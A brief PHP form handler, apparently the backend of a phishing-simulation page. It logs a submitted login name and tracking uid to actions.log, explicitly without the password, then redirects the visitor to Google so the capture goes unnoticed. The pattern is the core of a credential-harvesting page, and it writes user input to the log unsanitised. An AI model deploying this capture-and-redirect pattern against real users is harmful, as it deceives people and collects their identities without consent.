<?php
$uid = $_POST['uid'] ?? 'unknown';
$login = $_POST['login'] ?? '';

// Save the submitted login information to actions.log file with timestamp and uid NO PASSWORD
file_put_contents("actions.log",
    date("Y-m-d H:i:s") . " - FORM - " . $uid . " - login=" . $login . "\n",
    FILE_APPEND
);

// After logging, redirect the user to Google / or any website you want
header("Location: https://www.google.com");
exit;
?>
